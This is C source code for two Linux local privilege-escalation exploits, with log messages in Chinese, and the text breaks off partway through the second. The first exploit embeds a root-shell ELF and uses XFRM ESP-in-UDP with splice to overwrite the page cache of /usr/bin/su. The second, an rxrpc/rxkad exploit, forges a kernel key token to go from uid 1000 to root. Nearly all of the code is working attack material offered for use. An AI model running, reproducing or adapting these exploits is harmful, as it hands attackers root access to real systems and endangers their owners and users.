#define _GNU_SOURCE
#include <dirent.h>
#include <elf.h>
#include <limits.h>
#include <sys/utsname.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/vfs.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <signal.h>
#include <linux/io_uring.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_pedit.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define TARGET_PATH      "/usr/bin/su"
#define PATCH_OFFSET     0              /* overwrite whole ELF starting at file[0] */
#define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
#define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */

/*
 * 192-byte minimal x86_64 root-shell ELF.
 *   _start at 0x400078:
 *     setgid(0); setuid(0); setgroups(0, NULL);
 *     execve("/bin/sh", NULL, ["TERM=xterm", NULL]);
 *   PT_LOAD covers 0xb8 bytes (the actual content) at vaddr 0x400000 R+X.
 *
 *   Setting TERM in the new shell's env silences the
 *   "tput: No value for $TERM" / "test: : integer expected" noise
 *   /etc/bash.bashrc and friends emit when TERM is unset.
 *
 * Code (from offset 0x78):
 *   31 ff               xor edi, edi
 *   31 f6               xor esi, esi
 *   31 c0               xor eax, eax
 *   b0 6a               mov al, 0x6a              ; setgid
 *   0f 05               syscall
 *   b0 69               mov al, 0x69              ; setuid
 *   0f 05               syscall
 *   b0 74               mov al, 0x74              ; setgroups
 *   0f 05               syscall
 *   6a 00               push 0                    ; envp[1] = NULL
 *   48 8d 05 12 00 00 00 lea rax, [rip+0x12]      ; rax = "TERM=xterm"
 *   50                  push rax                  ; envp[0]
 *   48 89 e2            mov rdx, rsp              ; rdx = envp
 *   48 8d 3d 12 00 00 00 lea rdi, [rip+0x12]      ; rdi = "/bin/sh"
 *   31 f6               xor esi, esi              ; rsi = NULL (argv)
 *   6a 3b 58            push 0x3b ; pop rax       ; rax = 59 (execve)
 *   0f 05               syscall                   ; execve("/bin/sh",NULL,envp)
 *   "TERM=xterm\0"      (offset 0xa5..0xaf)
 *   "/bin/sh\0"         (offset 0xb0..0xb7)
 */
static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

/* ---- 终端彩色日志: NO_COLOR 或非 tty 时自动关闭 ---- */
#define CLR_RST "\033[0m"
#define CLR_GRN "\033[32m"
#define CLR_YEL "\033[33m"
#define CLR_CYN "\033[36m"
#define CLR_DIM "\033[2m"

static int color_enabled(void)
{
	static int cached = -1;

	if (cached < 0) {
		const char *no = getenv("NO_COLOR");

		cached = isatty(STDERR_FILENO) && (!no || !*no);
	}
	return cached;
}

extern int g_su_verbose;
int g_su_verbose = 0;
#define SLOG(fmt, ...) do { \
	if (g_su_verbose) { \
		if (color_enabled()) \
			fprintf(stderr, CLR_CYN "[su] " fmt CLR_RST "\n", ##__VA_ARGS__); \
		else \
			fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); \
	} \
} while (0)

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	int n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static void setup_userns_netns(void)
{
	uid_t real_uid = getuid();
	gid_t real_gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		SLOG("unshare 失败: %s", strerror(errno));
		exit(1);
	}
	write_proc("/proc/self/setgroups", "deny");
	char map[64];
	snprintf(map, sizeof(map), "0 %u 1", real_uid);
	if (write_proc("/proc/self/uid_map", map) < 0) {
		SLOG("写 uid_map 失败: %s", strerror(errno)); exit(1);
	}
	snprintf(map, sizeof(map), "0 %u 1", real_gid);
	if (write_proc("/proc/self/gid_map", map) < 0) {
		SLOG("写 gid_map 失败: %s", strerror(errno)); exit(1);
	}
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { SLOG("socket 失败: %s", strerror(errno)); exit(1); }
	struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("读取 lo 标志失败: %s", strerror(errno)); exit(1); }
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("设置 lo UP 失败: %s", strerror(errno)); exit(1); }
	close(s);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len  = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (sk < 0) return -1;
	struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
	if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

	char buf[4096] = {0};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = getpid();
	nlh->nlmsg_seq   = 1;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	xs->id.daddr.a4 = inet_addr("127.0.0.1");
	xs->id.spi      = htonl(spi);
	xs->id.proto    = IPPROTO_ESP;
	xs->saddr.a4    = inet_addr("127.0.0.1");
	xs->family      = AF_INET;
	xs->mode        = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid       = 0x1234;
	xs->flags       = XFRM_STATE_ESN;
	xs->lft.soft_byte_limit   = (uint64_t)-1;
	xs->lft.hard_byte_limit   = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	xs->sel.family  = AF_INET;
	xs->sel.prefixlen_d = 32;
	xs->sel.prefixlen_s = 32;
	xs->sel.daddr.a4 = inet_addr("127.0.0.1");
	xs->sel.saddr.a4 = inet_addr("127.0.0.1");

	{
		char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
		aa->alg_key_len   = 32 * 8;
		aa->alg_trunc_len = 128;
		memset(aa->alg_key, 0xAA, 32);
		put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
	}
	{
		char alg_buf[sizeof(struct xfrm_algo) + 16];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
		ea->alg_key_len = 16 * 8;
		memset(ea->alg_key, 0xBB, 16);
		put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
	}
	{
		struct xfrm_encap_tmpl enc;
		memset(&enc, 0, sizeof(enc));
		enc.encap_type  = UDP_ENCAP_ESPINUDP;
		enc.encap_sport = htons(ENC_PORT);
		enc.encap_dport = htons(ENC_PORT);
		enc.encap_oa.a4 = 0;
		put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
	}
	{
		char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
		memset(esn_buf, 0, sizeof(esn_buf));
		struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
		esn->bmp_len       = 1;
		esn->oseq          = 0;
		esn->seq           = REPLAY_SEQ;
		esn->oseq_hi       = 0;
		esn->seq_hi        = patch_seqhi;
		esn->replay_window = 32;
		put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
	}

	if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
	char rbuf[4096];
	int n = recv(sk, rbuf, sizeof(rbuf), 0);
	if (n < 0) { close(sk); return -1; }
	struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
	if (rh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = NLMSG_DATA(rh);
		if (e->error) { close(sk); return -1; }
	}
	close(sk);
	return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
	int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_recv < 0) return -1;
	int one = 1;
	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	struct sockaddr_in sa_d = {
		.sin_family = AF_INET,
		.sin_port   = htons(ENC_PORT),
		.sin_addr   = { inet_addr("127.0.0.1") },
	};
	if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_recv); return -1;
	}
	int encap = UDP_ENCAP_ESPINUDP;
	if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
		close(sk_recv); return -1;
	}
	int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_send < 0) { close(sk_recv); return -1; }
	if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_send); close(sk_recv); return -1;
	}
	int file_fd = open(path, O_RDONLY);
	if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

	int pfd[2];
	if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

	uint8_t hdr[24];
	*(uint32_t*)(hdr + 0) = htonl(spi);
	*(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
	memset(hdr + 8, 0xCC, 16);

	struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
	if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
		close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
	}
	off_t off = offset;
	ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (s != 16) {
		close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
	}
	s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
	/* still proceed regardless of splice rc — kernel may have already
	 * decrypted the page in the time between splice and recv */
	usleep(150 * 1000);

	close(file_fd); close(pfd[0]); close(pfd[1]);
	close(sk_send); close(sk_recv);
	return s == 40 ? 0 : -1;
}

static int verify_byte(const char *path, off_t offset, uint8_t want)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;
	uint8_t got;
	if (pread(fd, &got, 1, offset) != 1) { close(fd); return -1; }
	close(fd);
	return got == want ? 0 : -1;
}

static int corrupt_su(void)
{
	setup_userns_netns();
	usleep(100 * 1000);

	/* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
	 * desired payload word in its seq_hi field. */
	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
		uint32_t spi = 0xDEADBE10 + i;
		uint32_t seqhi =
			((uint32_t)shell_elf[i*4 + 0] << 24) |
			((uint32_t)shell_elf[i*4 + 1] << 16) |
			((uint32_t)shell_elf[i*4 + 2] <<  8) |
			((uint32_t)shell_elf[i*4 + 3]);
		if (add_xfrm_sa(spi, seqhi) < 0) {
			SLOG("注册 XFRM SA #%d 失败", i);
			return -1;
		}
	}
	SLOG("已注册 %d 个 XFRM SA", PAYLOAD_LEN / 4);

	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
		uint32_t spi = 0xDEADBE10 + i;
		off_t off = PATCH_OFFSET + i * 4;
		if (do_one_write(TARGET_PATH, off, spi) < 0) {
			SLOG("第 %d 次写入 (off=0x%lx) 失败", i, (long)off);
			return -1;
		}
	}
	SLOG("已写入 %d 字节到 %s (起始 0x%x)",
			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
	return 0;
}

int su_lpe_main(int argc, char **argv)
{
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
			g_su_verbose = 1;
		else if (!strcmp(argv[i], "--corrupt-only")) {
			/* compat: 本路径本身就只做页缓存改写 */
		}
	}
	if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

	pid_t cpid = fork();
	if (cpid < 0) return 1;
	if (cpid == 0) {
		int rc = corrupt_su();
		_exit(rc == 0 ? 0 : 2);
	}
	int cstatus;
	waitpid(cpid, &cstatus, 0);
	if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
		SLOG("写 page cache 子进程失败 (status=0x%x)", cstatus);
		return 1;
	}

	/* Sanity check: bytes at the embedded ELF entry (file offset 0x78
	 * after our overwrite) should be 0x31 0xff (xor edi, edi — first
	 * instruction of the new shellcode). */
	if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
			verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
		SLOG("写入后校验失败 (目标未变化)");
		return 1;
	}
	SLOG("/usr/bin/su 页缓存已被改写 (入口 0x%x = shellcode)",
			ENTRY_OFFSET);
	return 0;
}
/*
 * rxrpc/rxkad LPE — uid=1000 → root
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <poll.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <linux/if_alg.h>
#include <net/if.h>
#include <termios.h>

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000000
#endif

/* ---- rxrpc constants ---- */
#define RXRPC_PACKET_TYPE_DATA          1
#define RXRPC_PACKET_TYPE_ACK           2
#define RXRPC_PACKET_TYPE_ABORT         4
#define RXRPC_PACKET_TYPE_CHALLENGE     6
#define RXRPC_PACKET_TYPE_RESPONSE      7
#define RXRPC_CLIENT_INITIATED          0x01
#define RXRPC_REQUEST_ACK               0x02
#define RXRPC_LAST_PACKET               0x04
#define RXRPC_CHANNELMASK               3
#define RXRPC_CIDSHIFT                  2

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;        /* big-endian on wire */
	uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
	uint32_t version;
	uint32_t nonce;
	uint32_t min_level;
	uint32_t __padding;
} __attribute__((packed));

/* Attacker-chosen 8-byte session key used for the rxkad token.
 * Mutable because the LPE brute-force iterates over keys looking for
 * one that decrypts the file's UID field to a "0:" prefix. */
static uint8_t SESSION_KEY[8] = {
	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};

/* 全局详细开关: 0=默认(只输出 LOG/WARN 关键日志), 1=-v(额外输出 DBG/搜索进度) */
int g_verbose;

#define LOG(fmt, ...) do { \
	if (color_enabled()) \
		fprintf(stderr, CLR_GRN "[+] " fmt CLR_RST "\n", ##__VA_ARGS__); \
	else \
		fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__); \
} while (0)

#define WARN(fmt, ...) do { \
	if (color_enabled()) \
		fprintf(stderr, CLR_YEL "[!] " fmt CLR_RST "\n", ##__VA_ARGS__); \
	else \
		fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__); \
} while (0)

#define DBG(fmt, ...) do { \
	if (g_verbose) { \
		if (color_enabled()) \
			fprintf(stderr, CLR_DIM "[.] " fmt CLR_RST "\n", ##__VA_ARGS__); \
		else \
			fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__); \
	} \
} while (0)

/* =================================================================== */
/* unshare + map setup                                                  */
/* =================================================================== */

static int write_file(const char *path, const char *fmt, ...)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	char buf[256]; va_list ap; va_start(ap, fmt);
	int n = vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
	int r = (int)write(fd, buf, n); close(fd);
	return r;
}

static int do_unshare_userns_netns(void)
{
	uid_t real_uid = getuid();
	gid_t real_gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		WARN("unshare(NEWUSER|NEWNET) 失败: %s", strerror(errno));
		return -1;
	}
	LOG("unshare(USER|NET) 成功, 真实 uid=%u", real_uid);
	write_file("/proc/self/setgroups", "deny");
	if (write_file("/proc/self/uid_map", "%u %u 1", real_uid, real_uid) < 0) {
		WARN("写 uid_map 失败: %s", strerror(errno)); return -1;
	}
	if (write_file("/proc/self/gid_map", "%u %u 1", real_gid, real_gid) < 0) {
		WARN("写 gid_map 失败: %s", strerror(errno)); return -1;
	}
	LOG("uid/gid 已映射 %u/%u; 在 netns 内获得 CAP_NET_RAW",
			real_uid, real_gid);

	/* ifup lo */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
		strcpy(ifr.ifr_name, "lo");
		if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
			ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
			if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
				WARN("设置 lo UP 失败: %s", strerror(errno));
			else
				LOG("新 netns 中 lo 已启用");
		}
		close(s);
	}
	return 0;
}

/* =================================================================== */
/* rxrpc key (rxkad v1 token with attacker session key)                 */
/* =================================================================== */

static long key_add(const char *type, const char *desc,
		const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
	uint8_t *p = out;
	uint32_t now = (uint32_t)time(NULL);
	uint32_t expires = now + 86400;
	*(uint32_t *)p = htonl(0); p += 4;   /* flags */
	const char *cell = "evil";
	uint32_t clen = strlen(cell);
	*(uint32_t *)p = htonl(clen); p += 4;
	memcpy(p, cell, clen);
	uint32_t pad = (4 - (clen & 3)) & 3;
	memset(p + clen, 0, pad);
	p += clen + pad;
	*(uint32_t *)p = htonl(1); p += 4;   /* ntoken */
	uint8_t *toklen_p = p; p += 4;
	uint8_t *tokstart = p;
	*(uint32_t *)p = htonl(2); p += 4;   /* sec_ix = RXKAD */
	*(uint32_t *)p = htonl(0); p += 4;   /* vice_id */
	*(uint32_t *)p = htonl(1); p += 4;   /* kvno */
	memcpy(p, SESSION_KEY, 8); p += 8;   /* session_key K */
	*(uint32_t *)p = htonl(now); p += 4;
	*(uint32_t *)p = htonl(expires); p += 4;
	*(uint32_t *)p = htonl(1); p += 4;   /* primary_flag */
	*(uint32_t *)p = htonl(8); p += 4;   /* ticket_len */
	memset(p, 0xCC, 8); p += 8;          /* ticket */
	uint32_t toklen = (uint32_t)(p - tokstart);
	*(uint32_t *)toklen_p = htonl(toklen);
	if ((size_t)(p - out) > maxlen) { errno = E2BIG; return -1; }
	return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
	uint8_t buf[512];
	int n = build_rxrpc_v1_token(buf, sizeof(buf));
	if (n < 0) return -1;
	return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

/* =================================================================== */
/* AF_ALG pcbc(fcrypt) helpers                                          */
/* =================================================================== */

static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
	int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (s < 0) { WARN("创建 AF_ALG socket 失败: %s", strerror(errno)); return -1; }
	struct sockaddr_alg sa = { .salg_family = AF_ALG };
	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("绑定 pcbc(fcrypt) 失败: %s", strerror(errno));
		close(s); return -1;
	}
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
		WARN("设置算法密钥失败: %s", strerror(errno));
		close(s); return -1;
	}
	return s;
}

/* Encrypt-or-decrypt a 1+ block of data with a given IV. */
static int alg_op(int alg_s, int op, const uint8_t iv[8],
		const void *in, size_t inlen, void *out)
{
	int op_fd = accept(alg_s, NULL, NULL);
	if (op_fd < 0) { WARN("accept(AF_ALG) 失败: %s", strerror(errno)); return -1; }

	char cbuf[CMSG_SPACE(sizeof(int)) +
		CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
	struct msghdr msg = {0};
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_OP;
	c->cmsg_len = CMSG_LEN(sizeof(int));
	*(int *)CMSG_DATA(c) = op;

	c = CMSG_NXTHDR(&msg, c);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_IV;
	c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
	struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
	aiv->ivlen = 8;
	memcpy(aiv->iv, iv, 8);

	struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;

	if (sendmsg(op_fd, &msg, 0) < 0) {
		WARN("AF_ALG sendmsg 失败: %s", strerror(errno));
		close(op_fd); return -1;
	}
	ssize_t n = read(op_fd, out, inlen);
	close(op_fd);
	if (n != (ssize_t)inlen) {
		WARN("AF_ALG 读取 %zd 字节 (期望 %zu) 失败: %s",
				n, inlen, strerror(errno));
		return -1;
	}
	return 0;
}

/* Compute conn->rxkad.csum_iv (ref: rxkad_prime_packet_security):
 *   tmpbuf[0..3] = htonl(epoch, cid, 0, security_ix)  (16 B)
 *   PCBC-encrypt(tmpbuf, IV=session_key) → out[16]
 *   csum_iv = out[8..15]   (last 8 B = "tmpbuf[2..3]" after encryption)
 */
static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
		const uint8_t key[8], uint8_t csum_iv[8])
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
	uint8_t  out[16];
	int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
	close(s);
	if (rc < 0) return -1;
	memcpy(csum_iv, out + 8, 8);
	return 0;
}

/* Compute the wire cksum (ref: rxkad_secure_packet @rxkad.c:342):
 *   x = (cid_low2 << 30) | (seq & 0x3fffffff)
 *   buf[0] = htonl(call_id), buf[1] = htonl(x)    (8 B)
 *   PCBC-encrypt(buf, IV=csum_iv) → enc[8]
 *   y = ntohl(enc[1]); cksum = (y >> 16) & 0xffff;  if zero -> 1
 */
static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
		const uint8_t key[8], const uint8_t csum_iv[8],
		uint16_t *cksum_out)
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
	x |= seq & 0x3fffffff;
	uint32_t in[2] = { htonl(call_id), htonl(x) };
	uint32_t out[2];
	int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
	close(s);
	if (rc < 0) return -1;
	uint32_t y = ntohl(out[1]);
	uint16_t v = (y >> 16) & 0xffff;
	if (v == 0) v = 1;
	*cksum_out = v;
	return 0;
}

/* =================================================================== */
/* AF_RXRPC client                                                      */
/* =================================================================== */

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0) { WARN("创建 rxrpc 客户端 socket 失败: %s", strerror(errno)); return -1; }
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
				keyname, strlen(keyname)) < 0) {
		WARN("设置客户端 rxkad 密钥失败: %s", strerror(errno)); close(fd); return -1;
	}
	int min_level = RXRPC_SECURITY_AUTH;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
				&min_level, sizeof(min_level)) < 0) {
		WARN("设置最低安全级别失败: %s", strerror(errno));
		close(fd); return -1;
	}
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
		WARN("客户端绑定 :%u 失败: %s", local_port, strerror(errno));
		close(fd); return -1;
	}
	LOG("rxrpc 客户端已绑定 :%u", local_port);
	return fd;
}

static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
		uint16_t service_id,
		unsigned long user_call_id)
{
	char data[8] = "PINGPING";
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg = {0};
	msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;

	/* Don't block forever if no reply ever comes through this single sendmsg. */
	int fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);

	ssize_t n = sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);
	if (n < 0) {
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
